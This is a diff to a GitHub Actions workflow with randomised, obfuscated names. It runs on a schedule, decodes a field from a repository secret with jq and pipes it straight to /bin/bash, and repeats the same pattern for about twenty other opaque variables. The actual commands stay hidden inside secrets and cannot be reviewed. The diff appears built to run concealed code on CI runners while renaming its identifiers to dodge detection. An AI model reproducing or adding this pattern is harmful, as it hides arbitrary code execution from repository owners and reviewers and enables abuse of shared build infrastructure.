@@ -3,8 +3,9 @@ name: suyanzhn
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 3/6 * * *'
-jobs:  # 31066
+    - cron: '32 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +13,26 @@ jobs:  # 31066
       - uses: actions/checkout@v4
       - name: suyanzhn
         env:
-          je0: ${{ secrets.je0 }}
+          kxur6: ${{ secrets.kxur6 }}
         run: |
-          echo $je0 | jq -r .jpwfs8 | /bin/bash
-          echo $skk7511 | jq -r .qu18 | /bin/bash
-          echo $gtiv168 | jq -r .gc8 | /bin/bash
-          echo $pfvmq4566 | jq -r .kaq06 | /bin/bash
-          echo $vdquf21148 | jq -r .qhsb6772 | /bin/bash
-          echo $yb48 | jq -r .xf2926 | /bin/bash
-          echo $qdgo9660 | jq -r .i70 | /bin/bash
-          echo $j50360 | jq -r .v3 | /bin/bash
+          echo $kxur6 | jq -r .hnuc23 | /bin/bash
+          echo $ampo84031 | jq -r .a8870 | /bin/bash
+          echo $hlb39 | jq -r .p8961 | /bin/bash
+          echo $elbeo52617 | jq -r .rnv37 | /bin/bash
+          echo $v32 | jq -r .t751 | /bin/bash
+          echo $k85072 | jq -r .vli8 | /bin/bash
+          echo $xn775 | jq -r .jmajx4 | /bin/bash
+          echo $xpc03119 | jq -r .fhzg0 | /bin/bash
+          echo $jjyyf0 | jq -r .hr86 | /bin/bash
+          echo $kluq513 | jq -r .mkhug859 | /bin/bash
+          echo $rczs9 | jq -r .li6409 | /bin/bash
+          echo $usm3 | jq -r .vrmw04 | /bin/bash
+          echo $ljx17827 | jq -r .z35278 | /bin/bash
+          echo $jw3 | jq -r .os1348 | /bin/bash
+          echo $r25 | jq -r .coj6 | /bin/bash
+          echo $gsyh10 | jq -r .nbyp14508 | /bin/bash
+          echo $r1 | jq -r .t5 | /bin/bash
+          echo $th5746 | jq -r .hwz82295 | /bin/bash
+          echo $xbj19785 | jq -r .fwiy1574 | /bin/bash
+          echo $jjlsy115 | jq -r .hqef7579 | /bin/bash
 
